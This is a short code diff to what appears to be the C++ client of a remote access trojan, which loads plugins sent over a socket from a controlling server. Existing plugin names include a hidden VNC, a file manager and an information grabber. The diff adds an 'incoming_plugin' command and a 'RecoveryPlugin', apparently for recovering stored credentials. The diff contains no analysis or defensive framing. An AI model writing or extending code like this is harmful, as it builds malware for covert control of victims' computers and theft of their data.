@@ -103,6 +103,7 @@ private:
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
     const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
+    const string RECOVERY_PLUGIN_ID = "RecoveryPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -189,7 +190,10 @@ private:
             auto data = json::parse(json_str);
             string action = data.value("action", "");
 
-            if (action == "getinfo") {
+            if (action == "incoming_plugin") {
+                pendingPluginId = data.value("id", "");
+            }
+            else if (action == "getinfo") {
                 if (pluginMgr.isPluginLoaded(INFORMATION_PLUGIN_ID)) {
                     pluginMgr.executePlugin(INFORMATION_PLUGIN_ID, "RunPlugin", sock);
                 } else {
@@ -329,6 +333,8 @@ private:
                                     } else {
                                         pluginMgr.executePlugin(HIDDEN_VNC_PLUGIN_ID, "RunPlugin", sock);
                                     }
+                                } else if (pluginId == RECOVERY_PLUGIN_ID) {
+                                    pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
                                 }
                             }
 
